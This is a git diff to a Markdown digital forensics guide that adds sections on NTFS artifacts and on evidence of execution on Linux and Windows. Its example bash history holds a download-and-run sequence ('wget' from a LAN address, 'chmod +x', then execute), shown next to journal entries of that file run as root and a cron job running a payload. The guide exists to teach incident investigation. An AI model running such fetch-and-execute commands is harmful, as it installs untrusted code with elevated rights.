@@ -106,6 +106,8 @@ The bodyfile shows unique entries per file, and the timeline shows unique entrie
 
 #### Windows
 
+##### $MFT
+
 The most important artifact showing filesystem metadata is the `$MFT` table.
 
 We extracted the $MFT table with KAPE, using the `MFTECmd.exe` module to parse it into a csv.
@@ -151,6 +153,8 @@ Line	Tag	Entry Number	Sequence Number	Parent Entry Number	Parent Sequence Number
 
 ![mft](../media/mft-te.png)
 
+##### $Logfile
+
 The `$LogFile` keeps a record of changes to the NTFS volume (creations, modifications, renaming, and deletions), so in the event of a crash it can roll back to the previous state.
 
 Though it doesn't keep timestamps for each event, it uses Log Sequence Numbers to help in tracking events over time.
@@ -194,15 +198,61 @@ Alternatively, it can be opened with LibreOffice.
 ### Evidence of execution
 
 #### Unix
-- auditd logs
-- `cron` logs
-- shell history
-- systemd journal
+
+The shell history and `systemd` journal are quick starting points.
+
+``` bash
+# read the bash history for a user
+$ cat .bash_history
+wget http://192.168.1.37/notmalware
+chmod +x notmalware
+./notmalware
+
+# systemd journal shows entries since the last boot with timestamps in UTC
+journalctl --utc -b
+Jun 11 10:39:28 sss systemd[1]: Started session-49.scope - Session 49 of User sss.
+# filter for a specific executable
+$ journalctl --utc _EXE=/usr/bin/sudo
+Jun 11 11:24:20 sss sudo[312682]:      sss : TTY=pts/0 ; PWD=/home/sss ; USER=root ; COMMAND=./notmalware
+Jun 11 11:24:20 sss sudo[312682]: pam_unix(sudo:session): session opened for user root(uid=0) by sss(uid=1000)
+Jun 11 11:24:28 sss sudo[312682]: pam_unix(sudo:session): session closed for user root
+[..]
+
+# systemd journal shows evidence of execution via cron
+$ journalctl --utc -u cron
+Jun 11 14:35:02 sss CRON[312769]: pam_unix(cron:session): session closed for user root
+Jun 11 14:35:02 sss CRON[312775]: (sss) CMD (~/payload)
+Jun 11 14:36:01 sss CRON[312791]: pam_unix(cron:session): session opened for user sss(uid=1000) by sss(uid=0)
+Jun 11 14:36:01 sss CRON[312792]: (sss) CMD (~/payload)
+Jun 11 14:37:01 sss CRON[312797]: pam_unix(cron:session): session opened for user sss(uid=1000) by sss(uid=0)
+Jun 11 14:37:01 sss CRON[312798]: (sss) CMD (~/payload)
+[..]
+
+# auditd can show execve syscall events
+# auditd must be enabled and configured to log program execution events
+$ sudo ausearch -k exec_log --start 06/10/2026 --end 06/11/2026
+time->Thu Jun 11 12:07:18 2026
+[..]
+type=EXECVE msg=audit(1781179638.649:60): argc=1 a0="./notmalware"
+```
 
 #### Windows
-- Prefetch files
+
+##### Prefetch files
+
+Prefetch files keep a record of the first and last run time of an executable, and a count of how many times it ran.
+
+We parse prefetch files and output to csv.
+
+We analyze the csv with Timeline Explorer from EZ Tools.
+
+##### ShimCache (AppCompatCache)
+
+##### AmCache
+
+
 - SRUM
-- Registry (UserAssist, ShimCache / AppCompatCache, AmCache, RunMRU)
+- Registry (UserAssist, RunMRU)
 
 ### Evidence of past file presence
 
@@ -225,6 +275,14 @@ Alternatively, it can be opened with LibreOffice.
   - /var/log/btmp - failed logins, not enabled by default, read with `lastb -if <logfile>`
   - /var/log/lastlog - last login info for each user, read with `lastlog`
   - web server logs - often document initial compromise
+
+```
+# filter in syslog for kernel module load events
+# look for modules loaded outside of package management or at unusual times
+$ grep -i 'module\|insmod\|modprobe' /var/log/syslog
+### TODO ADD DIAMORPHINE
+```
+
 
 #### Windows
 - security logs
